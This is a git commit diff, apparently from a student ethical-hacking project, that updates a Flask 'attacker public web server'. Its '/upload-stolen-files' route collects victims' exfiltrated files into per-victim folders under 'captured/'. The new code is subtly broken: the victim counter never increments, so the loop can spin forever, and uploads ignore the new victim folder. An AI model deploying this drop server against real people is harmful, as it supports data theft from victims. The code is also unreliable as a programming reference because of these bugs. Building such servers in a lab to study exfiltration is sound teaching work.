331ce43f4a36f6eb35798efa2c4eee602481dde2
s10257584@connect.np.edu.sg <s10257584@connect.np.edu.sg>
2024-07-25 05:18:38 +0800

    Early morning commit

--- EH-Attacker-PublicWebServer/README.md
+++ EH-Attacker-PublicWebServer/README.md
@@ -4,4 +4,5 @@ Purpose: Remote File Upload
 
 ## Setup Instructions
 1. Clone the repository
-2. Install Flask on Attacker Public Web Server
+2. Install Flask on Attacker Public Web Server using pip install
+3. Run the web server
--- EH-Attacker-PublicWebServer/uploads.py
+++ EH-Attacker-PublicWebServer/uploads.py
@@ -9,8 +9,17 @@ UPLOAD_FOLDER = 'captured/'
 if not os.path.exists(UPLOAD_FOLDER):
     os.makedirs(UPLOAD_FOLDER)
 
+victim_index = 1
+
 @app.route('/upload-stolen-files', methods=['POST'])
 def upload_file():
+    while True:
+        victim_dir = os.path.join(UPLOAD_FOLDER, f"victim-{victim_index}/")
+        if not os.path.exists(victim_dir):
+            os.makedirs(victim_dir)
+            break
+        else:
+            victim_index + 1
     # Check if POST request has the file part
     if 'files[]' not in request.files:
         flash('No file part')
@@ -25,7 +34,7 @@ def upload_file():
         if file.filename == '':
             return jsonify({'error': 'No selected file (1)'}), 400
         file.save(os.path.join(UPLOAD_FOLDER, file.filename))
-    return jsonify({'success': 'Files uploaded successfully'}), 200
+    return jsonify({'success': f'Files uploaded successfully to directory {victim_dir}'}), 200
 
 if __name__ == '__main__':
     # Debugging
